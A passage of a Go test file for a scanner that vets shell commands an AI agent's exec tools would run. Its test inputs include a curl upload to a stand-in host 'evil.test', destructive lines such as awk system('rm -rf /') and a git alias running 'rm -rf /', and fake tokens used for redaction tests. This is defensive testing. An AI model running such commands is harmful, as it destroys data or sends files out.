	policy.DeniedCommands = nil

	scanner := NewScanner(policy)

	tests := []struct {
		name                  string
		command               string
		wantDecision          Decision
		wantDependencyFinding bool
	}{
		{
			name:                  "npm install",
			command:               "npm install left-pad",
			wantDecision:          DecisionAsk,
			wantDependencyFinding: true,
		},
		{
			name:                  "dependency command case is normalized",
			command:               "NPM INSTALL left-pad",
			wantDecision:          DecisionAsk,
			wantDependencyFinding: true,
		},
		{
			name:                  "installer is not install subcommand",
			command:               "npm installer left-pad",
			wantDecision:          DecisionAllow,
			wantDependencyFinding: false,
		},
		{
			name:                  "pip install",
			command:               "pip install requests",
			wantDecision:          DecisionAsk,
			wantDependencyFinding: true,
		},
		{
			name:                  "apt install",
			command:               "apt install jq",
			wantDecision:          DecisionAsk,
			wantDependencyFinding: true,
		},
		{
			name:                  "npm list is read only",
			command:               "npm list",
			wantDecision:          DecisionAllow,
			wantDependencyFinding: false,
		},
		{
			name:                  "pip show is read only",
			command:               "pip show requests",
			wantDecision:          DecisionAllow,
			wantDependencyFinding: false,
		},
		{
			name:                  "echoing install instructions is not installation",
			command:               "echo 'npm install left-pad'",
			wantDecision:          DecisionAllow,
			wantDependencyFinding: false,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			report, err := scanner.Scan(
				context.Background(),
				ScanRequest{
					ToolName: "workspace_exec",
					Command:  tc.command,
					Backend:  BackendWorkspaceExec,
				},
			)
			if err != nil {
				t.Fatalf("Scan() error = %v", err)
			}

			if report.Decision != tc.wantDecision {
				t.Errorf(
					"Decision = %q, want %q; report=%+v",
					report.Decision,
					tc.wantDecision,
					report,
				)
			}

			foundDependency := false
			for _, finding := range report.Findings {
				if finding.RuleID == ruleDependency {
					foundDependency = true
					break
				}
			}

			if foundDependency != tc.wantDependencyFinding {
				t.Errorf(
					"dependency Finding present = %v, want %v; Findings=%+v",
					foundDependency,
					tc.wantDependencyFinding,
					report.Findings,
				)
			}
		})
	}
}

func TestDependencyInstallAggregatesWithPipelineAndNetwork(t *testing.T) {
	policy := DefaultPolicy()
	policy.AllowedCommands = []string{
		"npm",
		"curl",
	}
	policy.DeniedCommands = nil
	policy.NetworkAllowlist = []string{"example.com"}

	scanner := NewScanner(policy)

	report, err := scanner.Scan(
		context.Background(),
		ScanRequest{
			ToolName: "workspace_exec",
			Command: "npm install left-pad && " +
				"curl https://evil.test/upload",
			Backend: BackendWorkspaceExec,
		},
	)
	if err != nil {
		t.Fatalf("Scan() error = %v", err)
	}

	if report.Decision != DecisionDeny {
		t.Errorf(
			"Decision = %q, want %q; report=%+v",
			report.Decision,
			DecisionDeny,
			report,
		)
	}

	foundRules := make(map[string]bool)
	for _, finding := range report.Findings {
		foundRules[finding.RuleID] = true
	}

	for _, wantRule := range []string{
		ruleDependency,
		rulePipeline,
		ruleNetwork,
	} {
		if !foundRules[wantRule] {
			t.Errorf(
				"Findings = %+v, want rule %q",
				report.Findings,
				wantRule,
			)
		}
	}
}

func TestResourceLimitsUseStrictUpperBoundaries(t *testing.T) {
	policy := DefaultPolicy()
	policy.AllowedCommands = []string{
		"sleep",
		"SLEEP",
		"sleeper",
		"echo",
	}
	policy.DeniedCommands = nil
	policy.MaxTimeoutSec = 300
	policy.MaxOutputBytes = 1024

	scanner := NewScanner(policy)

	tests := []struct {
		name           string
		command        string
		timeoutSec     int
		maxOutputBytes int
		wantDecision   Decision
		wantRule       string
	}{
		{
			name:         "sleep equal to timeout limit",
			command:      "sleep 300",
			wantDecision: DecisionAllow,
			wantRule:     ruleAllow,
		},
		{
			name:         "sleep exceeds timeout limit",
			command:      "sleep 301",
			wantDecision: DecisionAsk,
			wantRule:     ruleTimeout,
		},
		{
			name:         "uppercase sleep is detected",
			command:      "SLEEP 301",
			wantDecision: DecisionAsk,
			wantRule:     ruleTimeout,
		},
		{
			name:         "sleeper command is not sleep",
			command:      "sleeper 301",
			wantDecision: DecisionAllow,
			wantRule:     ruleAllow,
		},
		{
			name:         "request timeout equals limit",
			command:      "echo ok",
			timeoutSec:   300,
			wantDecision: DecisionAllow,
			wantRule:     ruleAllow,
		},
		{
			name:         "request timeout exceeds limit",
			command:      "echo ok",
			timeoutSec:   301,
			wantDecision: DecisionAsk,
			wantRule:     ruleTimeout,
		},
		{
			name:           "output limit equals policy limit",
			command:        "echo ok",
			maxOutputBytes: 1024,
			wantDecision:   DecisionAllow,
			wantRule:       ruleAllow,
		},
		{
			name:           "output limit exceeds policy limit",
			command:        "echo ok",
			maxOutputBytes: 1025,
			wantDecision:   DecisionAsk,
			wantRule:       ruleOutput,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			report, err := scanner.Scan(
				context.Background(),
				ScanRequest{
					ToolName:       "workspace_exec",
					Command:        tc.command,
					Backend:        BackendWorkspaceExec,
					TimeoutSec:     tc.timeoutSec,
					MaxOutputBytes: tc.maxOutputBytes,
				},
			)
			if err != nil {
				t.Fatalf("Scan() error = %v", err)
			}

			if report.Decision != tc.wantDecision {
				t.Errorf(
					"Decision = %q, want %q; report=%+v",
					report.Decision,
					tc.wantDecision,
					report,
				)
			}

			if report.RuleID != tc.wantRule {
				t.Errorf(
					"RuleID = %q, want %q; report=%+v",
					report.RuleID,
					tc.wantRule,
					report,
				)
			}
		})
	}
}

func TestResourceAbuseDurationAndConcurrency(t *testing.T) {
	policy := DefaultPolicy()
	policy.AllowedCommands = []string{
		"sleep",
		"go",
		"make",
		"echo",
	}
	policy.DeniedCommands = nil
	policy.MaxTimeoutSec = 300

	scanner := NewScanner(policy)

	tests := []struct {
		name         string
		command      string
		wantDecision Decision
		wantRule     string
	}{
		{
			name:         "unbounded sleep",
			command:      "sleep infinity",
			wantDecision: DecisionDeny,
			wantRule:     ruleInfiniteLoop,
		},
		{
			name:         "duration suffixed sleep exceeds limit",
			command:      "sleep 10m",
			wantDecision: DecisionAsk,
			wantRule:     ruleTimeout,
		},
		{
			name:         "duration suffixed sleep equals limit",
			command:      "sleep 5m",
			wantDecision: DecisionAllow,
			wantRule:     ruleAllow,
		},
		{
			name:         "fractional day sleep exceeds limit",
			command:      "sleep 0.1d",
			wantDecision: DecisionAsk,
			wantRule:     ruleTimeout,
		},
		{
			name:         "fractional day sleep below limit",
			command:      "sleep 0.001d",
			wantDecision: DecisionAllow,
			wantRule:     ruleAllow,
		},
		{
			name:         "unitless fractional sleep exceeds limit",
			command:      "sleep 999.5",
			wantDecision: DecisionAsk,
			wantRule:     ruleTimeout,
		},
		{
			name:         "scientific notation sleep exceeds limit",
			command:      "sleep 1e9",
			wantDecision: DecisionAsk,
			wantRule:     ruleTimeout,
		},
		{
			name:         "excessive go test parallelism",
			command:      "go test -p 10000 ./...",
			wantDecision: DecisionAsk,
			wantRule:     "SAFE-RESOURCE-CONCURRENCY",
		},
		{
			name:         "bounded go test parallelism",
			command:      "go test -p 4 ./...",
			wantDecision: DecisionAllow,
			wantRule:     ruleAllow,
		},
		{
			name:         "excessive go test runtime parallelism",
			command:      "go test -parallel 10000 ./...",
			wantDecision: DecisionAsk,
			wantRule:     ruleConcurrency,
		},
		{
			name:         "bounded go test runtime parallelism",
			command:      "go test -parallel 4 ./...",
			wantDecision: DecisionAllow,
			wantRule:     ruleAllow,
		},
		{
			name:         "unbounded make parallelism",
			command:      "make -j",
			wantDecision: DecisionAsk,
			wantRule:     ruleConcurrency,
		},
		{
			name:         "bounded make parallelism",
			command:      "make -j4",
			wantDecision: DecisionAllow,
			wantRule:     ruleAllow,
		},
		{
			name:         "echoing unbounded sleep is text",
			command:      "echo 'sleep infinity'",
			wantDecision: DecisionAllow,
			wantRule:     ruleAllow,
		},
		{
			name:         "echoing parallelism is text",
			command:      "echo 'go test -p 10000 ./...'",
			wantDecision: DecisionAllow,
			wantRule:     ruleAllow,
		},
		{
			name:         "echoing unbounded make parallelism is text",
			command:      "echo 'make -j'",
			wantDecision: DecisionAllow,
			wantRule:     ruleAllow,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			report, err := scanner.Scan(
				context.Background(),
				ScanRequest{
					ToolName: "workspace_exec",
					Command:  tc.command,
					Backend:  BackendWorkspaceExec,
				},
			)
			if err != nil {
				t.Fatalf("Scan() error = %v", err)
			}

			if report.Decision != tc.wantDecision {
				t.Errorf(
					"Decision = %q, want %q; report=%+v",
					report.Decision,
					tc.wantDecision,
					report,
				)
			}
			if report.RuleID != tc.wantRule {
				t.Errorf(
					"RuleID = %q, want %q; report=%+v",
					report.RuleID,
					tc.wantRule,
					report,
				)
			}
		})
	}
}

func TestScannerDetectsObviousInfiniteLoops(t *testing.T) {

	policy := DefaultPolicy()
	policy.AllowedCommands = []string{"echo"}
	policy.DeniedCommands = nil

	scanner := NewScanner(policy)

	tests := []struct {
		name                string
		command             string
		wantDecision        Decision
		wantInfiniteFinding bool
	}{
		{
			name:                "while true loop",
			command:             "while true; do echo tick; done",
			wantDecision:        DecisionDeny,
			wantInfiniteFinding: true,
		},
		{
			name:                "while colon loop",
			command:             "while :; do echo tick; done",
			wantDecision:        DecisionDeny,
			wantInfiniteFinding: true,
		},
		{
			name:                "C style endless for loop",
			command:             "for ((;;)); do echo tick; done",
			wantDecision:        DecisionDeny,
			wantInfiniteFinding: true,
		},
		{
			name:                "echoing while loop text is safe",
			command:             "echo 'while true; do echo tick; done'",
			wantDecision:        DecisionAllow,
			wantInfiniteFinding: false,
		},
		{
			name:                "echoing for loop text is safe",
			command:             "echo 'for ((;;)); do echo tick; done'",
			wantDecision:        DecisionAllow,
			wantInfiniteFinding: false,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			report, err := scanner.Scan(
				context.Background(),
				ScanRequest{
					ToolName: "workspace_exec",
					Command:  tc.command,
					Backend:  BackendWorkspaceExec,
				},
			)
			if err != nil {
				t.Fatalf("Scan() error = %v", err)
			}

			if report.Decision != tc.wantDecision {
				t.Errorf(
					"Decision = %q, want %q; report=%+v",
					report.Decision,
					tc.wantDecision,
					report,
				)
			}

			foundInfiniteLoop := false
			for _, finding := range report.Findings {
				if finding.RuleID == ruleInfiniteLoop {
					foundInfiniteLoop = true
					break
				}
			}

			if foundInfiniteLoop != tc.wantInfiniteFinding {
				t.Errorf(
					"infinite-loop Finding present = %v, want %v; Findings=%+v",
					foundInfiniteLoop,
					tc.wantInfiniteFinding,
					report.Findings,
				)
			}
		})
	}
}

func TestHostExecLongSessionAggregatesRiskSignals(t *testing.T) {
	policy := DefaultPolicy()
	policy.AllowedCommands = []string{"echo"}
	policy.DeniedCommands = nil
	policy.MaxTimeoutSec = 300

	scanner := NewScanner(policy)

	tests := []struct {
		name         string
		tty          bool
		background   bool
		timeoutSec   int
		wantDecision Decision
		wantRules    []string
	}{
		{
			name:         "ordinary bounded host command",
			timeoutSec:   300,
			wantDecision: DecisionAllow,
		},
		{
			name:         "host PTY session",
			tty:          true,
			timeoutSec:   300,
			wantDecision: DecisionAsk,
			wantRules:    []string{ruleHostPTY},
		},
		{
			name:         "host background process",
			background:   true,
			timeoutSec:   300,
			wantDecision: DecisionAsk,
			wantRules:    []string{ruleBackground},
		},
		{
			name:         "PTY background long session",
			tty:          true,
			background:   true,
			timeoutSec:   600,
			wantDecision: DecisionAsk,
			wantRules: []string{
				ruleHostPTY,
				ruleBackground,
				ruleTimeout,
			},
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			report, err := scanner.Scan(
				context.Background(),
				ScanRequest{
					ToolName:   "exec_command",
					Command:    "echo ready",
					Backend:    BackendHostExec,
					TTY:        tc.tty,
					Background: tc.background,
					TimeoutSec: tc.timeoutSec,
				},
			)
			if err != nil {
				t.Fatalf("Scan() error = %v", err)
			}

			if report.Decision != tc.wantDecision {
				t.Errorf(
					"Decision = %q, want %q; report=%+v",
					report.Decision,
					tc.wantDecision,
					report,
				)
			}

			foundRules := make(map[string]bool)
			for _, finding := range report.Findings {
				foundRules[finding.RuleID] = true
			}

			for _, wantRule := range tc.wantRules {
				if !foundRules[wantRule] {
					t.Errorf(
						"Findings = %+v, want rule %q",
						report.Findings,
						wantRule,
					)
				}
			}

			if len(tc.wantRules) == 0 &&
				len(report.Findings) != 0 {
				t.Errorf(
					"Findings = %+v, want no risk Finding",
					report.Findings,
				)
			}
		})
	}
}

func TestHostExecRejectsExplicitPathOverride(t *testing.T) {
	policy := DefaultPolicy()
	policy.AllowedCommands = []string{"git"}
	policy.DeniedCommands = nil
	policy.EnvAllowlist = []string{"PATH"}

	scanner := NewScanner(policy)

	tests := []struct {
		name         string
		backend      Backend
		env          map[string]string
		wantDecision Decision
		wantRule     string
	}{
		{
			name:         "host relative PATH override",
			backend:      BackendHostExec,
			env:          map[string]string{"PATH": "./malicious-bin"},
			wantDecision: DecisionDeny,
			wantRule:     ruleHostPath,
		},
		{
			name:         "host case folded PATH override",
			backend:      BackendHostExec,
			env:          map[string]string{"Path": "/tmp/custom-bin"},
			wantDecision: DecisionDeny,
			wantRule:     ruleHostPath,
		},
		{
			name:         "host inherited PATH",
			backend:      BackendHostExec,
			wantDecision: DecisionAllow,
			wantRule:     ruleAllow,
		},
		{
			name:         "workspace PATH override remains policy controlled",
			backend:      BackendWorkspaceExec,
			env:          map[string]string{"PATH": "./workspace-bin"},
			wantDecision: DecisionAllow,
			wantRule:     ruleAllow,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			report, err := scanner.Scan(
				context.Background(),
				ScanRequest{
					ToolName:   "exec_command",
					Command:    "git status",
					Backend:    tc.backend,
					Env:        tc.env,
					TimeoutSec: 300,
				},
			)
			if err != nil {
				t.Fatalf("Scan() error = %v", err)
			}

			if report.Decision != tc.wantDecision {
				t.Errorf(
					"Decision = %q, want %q; report=%+v",
					report.Decision,
					tc.wantDecision,
					report,
				)
			}

			if report.RuleID != tc.wantRule {
				t.Errorf(
					"RuleID = %q, want %q; report=%+v",
					report.RuleID,
					tc.wantRule,
					report,
				)
			}

			for _, evidence := range report.Evidence {
				for _, value := range tc.env {
					if value != "" && strings.Contains(evidence, value) {
						t.Errorf(
							"Evidence %q contains PATH value %q",
							evidence,
							value,
						)
					}
				}
			}
		})
	}
}

func TestHostExecPrivilegeWrappersAreDenied(t *testing.T) {
	policy := DefaultPolicy()
	policy.AllowedCommands = []string{
		"sudo",
		"SUDO",
		"su",
		"echo",
		"sudoku",
	}
	policy.DeniedCommands = nil

	scanner := NewScanner(policy)

	tests := []struct {
		name         string
		command      string
		wantDecision Decision
		wantRule     string
	}{
		{
			name:         "sudo command",
			command:      "sudo echo ready",
			wantDecision: DecisionDeny,
			wantRule:     ruleCommandPolicy,
		},
		{
			name:         "su command",
			command:      "su root",
			wantDecision: DecisionDeny,
			wantRule:     ruleCommandPolicy,
		},
		{
			name:         "uppercase sudo command",
			command:      "SUDO echo ready",
			wantDecision: DecisionDeny,
			wantRule:     ruleCommandPolicy,
		},
		{
			name:         "sudo used as ordinary echo argument",
			command:      "echo sudo",
			wantDecision: DecisionAllow,
			wantRule:     ruleAllow,
		},
		{
			name:         "sudoku command is not sudo",
			command:      "sudoku --version",
			wantDecision: DecisionAllow,
			wantRule:     ruleAllow,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			report, err := scanner.Scan(
				context.Background(),
				ScanRequest{
					ToolName: "exec_command",
					Command:  tc.command,
					Backend:  BackendHostExec,
				},
			)
			if err != nil {
				t.Fatalf("Scan() error = %v", err)
			}

			if report.Decision != tc.wantDecision {
				t.Errorf(
					"Decision = %q, want %q; report=%+v",
					report.Decision,
					tc.wantDecision,
					report,
				)
			}

			if report.RuleID != tc.wantRule {
				t.Errorf(
					"RuleID = %q, want %q; report=%+v",
					report.RuleID,
					tc.wantRule,
					report,
				)
			}
		})
	}
}

func TestEnvSecretDetectionDoesNotDependOnAllowlist(t *testing.T) {
	policy := DefaultPolicy()
	policy.AllowedCommands = []string{"echo"}
	policy.DeniedCommands = nil

	// A nil allowlist disables environment key checks, but secret value
	// detection must still run.
	policy.EnvAllowlist = nil

	scanner := NewScanner(policy)

	report, err := scanner.Scan(
		context.Background(),
		ScanRequest{
			ToolName: "workspace_exec",
			Command:  "echo ready",
			Backend:  BackendWorkspaceExec,
			Env: map[string]string{
				"CUSTOM": "api_key=sk-abcdefghijklmnop",
			},
		},
	)
	if err != nil {
		t.Fatalf("Scan() error = %v", err)
	}

	if report.Decision != DecisionDeny {
		t.Errorf(
			"Decision = %q, want %q; report=%+v",
			report.Decision,
			DecisionDeny,
			report,
		)
	}

	foundSecret := false
	for _, finding := range report.Findings {
		if finding.RuleID == ruleSecret {
			foundSecret = true
			break
		}
	}

	if !foundSecret {
		t.Errorf(
			"Findings = %+v, want rule %q",
			report.Findings,
			ruleSecret,
		)
	}
}

func TestEnvAllowlistAndSecretFindingsAggregate(t *testing.T) {
	policy := DefaultPolicy()
	policy.AllowedCommands = []string{"echo"}
	policy.DeniedCommands = nil
	policy.EnvAllowlist = []string{"PATH"}

	scanner := NewScanner(policy)

	tests := []struct {
		name         string
		env          map[string]string
		wantDecision Decision
		wantRules    []string
	}{
		{
			name: "allowlisted environment key",
			env: map[string]string{
				"PATH": "/usr/bin:/bin",
			},
			wantDecision: DecisionAllow,
		},
		{
			name: "allowlisted key comparison ignores case",
			env: map[string]string{
				"path": "/usr/bin:/bin",
			},
			wantDecision: DecisionAllow,
		},
		{
			name: "non allowlisted environment key",
			env: map[string]string{
				"CUSTOM": "ordinary-value",
			},
			wantDecision: DecisionAsk,
			wantRules: []string{
				ruleEnv,
			},
		},
		{
			name: "secret in allowlisted key",
			env: map[string]string{
				"PATH": "api_key=sk-abcdefghijklmnop",
			},
			wantDecision: DecisionDeny,
			wantRules: []string{
				ruleSecret,
			},
		},
		{
			name: "secret in non allowlisted key",
			env: map[string]string{
				"CUSTOM": "api_key=sk-abcdefghijklmnop",
			},
			wantDecision: DecisionDeny,
			wantRules: []string{
				ruleEnv,
				ruleSecret,
			},
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			report, err := scanner.Scan(
				context.Background(),
				ScanRequest{
					ToolName: "workspace_exec",
					Command:  "echo ready",
					Backend:  BackendWorkspaceExec,
					Env:      tc.env,
				},
			)
			if err != nil {
				t.Fatalf("Scan() error = %v", err)
			}

			if report.Decision != tc.wantDecision {
				t.Errorf(
					"Decision = %q, want %q; report=%+v",
					report.Decision,
					tc.wantDecision,
					report,
				)
			}

			foundRules := make(map[string]bool)
			for _, finding := range report.Findings {
				foundRules[finding.RuleID] = true
			}

			for _, wantRule := range tc.wantRules {
				if !foundRules[wantRule] {
					t.Errorf(
						"Findings = %+v, want rule %q",
						report.Findings,
						wantRule,
					)
				}
			}

			if len(tc.wantRules) == 0 &&
				len(report.Findings) != 0 {
				t.Errorf(
					"Findings = %+v, want no Finding",
					report.Findings,
				)
			}
		})
	}
}

func TestFirstDisallowedProxyEnvHostIsDeterministic(t *testing.T) {
	env := map[string]string{
		"HTTP_PROXY": "http://http-proxy.example",
		"ALL_PROXY":  "http://all-proxy.example",
	}
	key, host := firstDisallowedProxyEnvHost(env, nil)
	if key != "ALL_PROXY" || host != "all-proxy.example" {
		t.Fatalf("proxy = %q/%q, want ALL_PROXY/all-proxy.example", key, host)
	}
	for i := 0; i < 100; i++ {
		gotKey, gotHost := firstDisallowedProxyEnvHost(env, nil)
		if gotKey != key || gotHost != host {
			t.Fatalf("proxy changed on iteration %d: %q/%q", i, gotKey, gotHost)
		}
	}
}

func TestShellBypassRulesAndQuotedSafeCounterexamples(t *testing.T) {
	policy := DefaultPolicy()
	policy.AllowedCommands = []string{
		"echo",
		"bash",
		"BASH",
		"eval",
	}
	policy.DeniedCommands = nil

	scanner := NewScanner(policy)

	tests := []struct {
		name         string
		command      string
		wantDecision Decision
		wantRule     string
	}{
		{
			name:         "bash wrapper",
			command:      "bash -c 'echo ready'",
			wantDecision: DecisionDeny,
			wantRule:     ruleCommandPolicy,
		},
		{
			name:         "uppercase bash wrapper",
			command:      "BASH -c 'echo ready'",
			wantDecision: DecisionDeny,
			wantRule:     ruleCommandPolicy,
		},
		{
			name:         "eval wrapper",
			command:      "eval echo ready",
			wantDecision: DecisionDeny,
			wantRule:     ruleCommandPolicy,
		},
		{
			name:         "command substitution",
			command:      "echo $(date)",
			wantDecision: DecisionAsk,
			wantRule:     ruleParse,
		},
		{
			name:         "parameter expansion",
			command:      "echo $HOME",
			wantDecision: DecisionAsk,
			wantRule:     ruleParse,
		},
		{
			name:         "output redirection",
			command:      "echo hello > output.txt",
			wantDecision: DecisionAsk,
			wantRule:     ruleParse,
		},
		{
			name:         "single quoted substitution is literal text",
			command:      "echo '$(date)'",
			wantDecision: DecisionAllow,
			wantRule:     ruleAllow,
		},
		{
			name:         "single quoted parameter is literal text",
			command:      "echo '$HOME'",
			wantDecision: DecisionAllow,
			wantRule:     ruleAllow,
		},
		{
			name:         "single quoted redirection is literal text",
			command:      "echo 'hello > output.txt'",
			wantDecision: DecisionAllow,
			wantRule:     ruleAllow,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			report, err := scanner.Scan(
				context.Background(),
				ScanRequest{
					ToolName: "workspace_exec",
					Command:  tc.command,
					Backend:  BackendWorkspaceExec,
				},
			)
			if err != nil {
				t.Fatalf("Scan() error = %v", err)
			}

			if report.Decision != tc.wantDecision {
				t.Errorf(
					"Decision = %q, want %q; report=%+v",
					report.Decision,
					tc.wantDecision,
					report,
				)
			}

			if report.RuleID != tc.wantRule {
				t.Errorf(
					"RuleID = %q, want %q; report=%+v",
					report.RuleID,
					tc.wantRule,
					report,
				)
			}
		})
	}
}

func TestScannerDeniesSecondaryExecutorBypasses(
	t *testing.T,
) {
	scanner := NewScanner(DefaultPolicy())
	tests := []string{
		`find /etc -delete`,
		`find . -exec rm -rf {} \;`,
		`awk 'BEGIN { system("rm -rf /") }'`,
		`git -c alias.pwn='!rm -rf /' pwn`,
		`sed -n 'e rm -rf /' README.md`,
	}

	for _, command := range tests {
		t.Run(command, func(t *testing.T) {
			report, err := scanner.Scan(
				context.Background(),
				ScanRequest{
					ToolName: "workspace_exec",
					Command:  command,
					Backend:  BackendWorkspaceExec,
				},
			)
			if err != nil {
				t.Fatalf("Scanner.Scan() error = %v", err)
			}
			if report.Decision != DecisionDeny {
				t.Errorf(
					"Decision = %q, want %q; report=%+v",
					report.Decision,
					DecisionDeny,
					report,
				)
			}
			if report.RuleID != ruleCommandPolicy {
				t.Errorf(
					"RuleID = %q, want %q; report=%+v",
					report.RuleID,
					ruleCommandPolicy,
					report,
				)
			}
		})
	}
}

func TestJSONLAuditorRecordsAllowAskAndDenyWithoutSecrets(
	t *testing.T,
) {
	const secret = "sk-abcdefghijklmnop"

	path := filepath.Join(
		t.TempDir(),
		"tool_safety_audit.jsonl",
	)

	policy := DefaultPolicy()
	policy.AllowedCommands = []string{
		"echo",
		"wc",
	}
	policy.DeniedCommands = nil

	scanner := NewScanner(
		policy,
		WithAuditor(NewJSONLAuditor(path)),
	)

	requests := []ScanRequest{
		{
			ToolName: "workspace_exec",
			Command:  "echo ready",
			Backend:  BackendWorkspaceExec,
		},
		{
			ToolName: "workspace_exec",
			Command:  "echo ready | wc -c",
			Backend:  BackendWorkspaceExec,
		},
		{
			ToolName: "workspace_exec",
			Command:  "echo api_key=" + secret,
			Backend:  BackendWorkspaceExec,
		},
	}

	for _, req := range requests {
		if _, err := scanner.Scan(
			context.Background(),
			req,
		); err != nil {
			t.Fatalf(
				"Scan(%q) error = %v",
				req.Command,
				err,
			)
		}
	}

	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("ReadFile() error = %v", err)
	}

	rawAudit := string(data)
	if strings.Contains(rawAudit, secret) {
		t.Fatalf(
			"audit contains secret %q: %s",
			secret,
			rawAudit,
		)
	}
	if strings.Contains(rawAudit, `"command"`) {
		t.Fatalf(
			"audit unexpectedly contains command field: %s",
			rawAudit,
		)
	}

	lines := strings.Split(
		strings.TrimSpace(rawAudit),
		"\n",
	)
	if len(lines) != 3 {
		t.Fatalf(
			"audit lines = %d, want 3; audit=%s",
			len(lines),
			rawAudit,
		)
	}

	want := []struct {
		decision Decision
		risk     RiskLevel
		ruleID   string
		redacted bool
		blocked  bool
	}{
		{
			decision: DecisionAllow,
			risk:     RiskLow,
			ruleID:   ruleAllow,
			redacted: false,
			blocked:  false,
		},
		{
			decision: DecisionAsk,
			risk:     RiskMedium,
			ruleID:   rulePipeline,
			redacted: false,
			blocked:  true,
		},
		{
			decision: DecisionDeny,
			risk:     RiskCritical,
			ruleID:   ruleSecret,
			redacted: true,
			blocked:  true,
		},
	}

	for i, line := range lines {
		var event AuditEvent
		if err := json.Unmarshal(
			[]byte(line),
			&event,
		); err != nil {
			t.Fatalf(
				"line %d is invalid JSON: %v; line=%s",
				i,
				err,
				line,
			)
		}

		if event.Timestamp.IsZero() {
			t.Errorf(
				"line %d Timestamp is zero",
				i,
			)
		}
		if event.ToolName != "workspace_exec" {
			t.Errorf(
				"line %d ToolName = %q, want workspace_exec",
				i,
				event.ToolName,
			)
		}
		if event.Backend != BackendWorkspaceExec {
			t.Errorf(
				"line %d Backend = %q, want %q",
				i,
				event.Backend,
				BackendWorkspaceExec,
			)
		}
		if event.Decision != want[i].decision {
			t.Errorf(
				"line %d Decision = %q, want %q",
				i,
				event.Decision,
				want[i].decision,
			)
		}
		if event.RiskLevel != want[i].risk {
			t.Errorf(
				"line %d RiskLevel = %q, want %q",
				i,
				event.RiskLevel,
				want[i].risk,
			)
		}
		if event.RuleID != want[i].ruleID {
			t.Errorf(
				"line %d RuleID = %q, want %q",
				i,
				event.RuleID,
				want[i].ruleID,
			)
		}
		if event.Redacted != want[i].redacted {
			t.Errorf(
				"line %d Redacted = %v, want %v",
				i,
				event.Redacted,
				want[i].redacted,
			)
		}
		if event.Blocked != want[i].blocked {
			t.Errorf(
				"line %d Blocked = %v, want %v",
				i,
				event.Blocked,
				want[i].blocked,
			)
		}
		if event.DurationMS < 0 {
			t.Errorf(
				"line %d DurationMS = %d, want >= 0",
				i,
				event.DurationMS,
			)
		}
	}
}

func TestRedactStringSecretCorpus(t *testing.T) {
	tests := []struct {
		name   string
		input  string
		secret string
	}{
		{
			name: "authorization bearer",
			input: "Authorization: Bearer " +
				"abcdefghijklmnopqrstuvwxyz",
			secret: "abcdefghijklmnopqrstuvwxyz",
		},
		{
			name:   "password assignment",
			input:  "password=correct-horse-battery-staple",
			secret: "correct-horse-battery-staple",
		},
		{
			name:   "multiword password assignment",
			input:  "password=correct horse battery staple",
			secret: "correct horse battery staple",
		},
		{
			name:   "API key assignment",
			input:  "api_key=sk-abcdefghijklmnop",
			secret: "sk-abcdefghijklmnop",
		},
		{
			name:   "AWS access key",
			input:  syntheticAWSAccessKey("ABCDEFGHIJKLMNOP"),
			secret: syntheticAWSAccessKey("ABCDEFGHIJKLMNOP"),
		},
		{
			name: "GitHub classic token",
			input: "ghp_" +
				"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij",
			secret: "ghp_" +
				"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij",
		},
		{
			name: "GitHub fine grained token",
			input: "github_pat_" +
				"11AA22BB33CC44DD55EE66FF77GG88HH",
			secret: "github_pat_" +
				"11AA22BB33CC44DD55EE66FF77GG88HH",
		},
		{
			name: "PEM private key",
			input: "-----BEGIN PRIVATE KEY-----\n" +
				"super-secret-private-key-material\n" +
				"-----END PRIVATE KEY-----",
			secret: "super-secret-private-key-material",
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			redacted, changed := RedactString(
				tc.input,
			)

			if !changed {
				t.Errorf(
					"RedactString() changed = false; input=%q",
					tc.input,
				)
			}

			if strings.Contains(
				redacted,
				tc.secret,
			) {
				t.Errorf(
					"redacted value still contains secret %q: %q",
					tc.secret,
					redacted,
				)
			}

			if !strings.Contains(
				redacted,
				"[REDACTED]",
			) {
				t.Errorf(
					"redacted value = %q, want [REDACTED]",
					redacted,
				)
			}
		})
	}
}

func TestRedactStringSafeCounterexamples(t *testing.T) {
	safeValues := []string{
		"token budget is 100",
		"password policy is enabled",
		"the API key documentation is public",
		"Bearer is an authentication scheme",
		"AKIA is only a four-letter word here",
		"github_pat is a field name without a value",
	}

	for _, input := range safeValues {
		t.Run(input, func(t *testing.T) {
			redacted, changed := RedactString(input)

			if changed {
				t.Errorf(
					"RedactString(%q) unexpectedly changed to %q",
					input,
					redacted,
				)
			}
			if redacted != input {
				t.Errorf(
					"RedactString(%q) = %q, want unchanged",
					input,
					redacted,
				)
			}
		})
	}
}
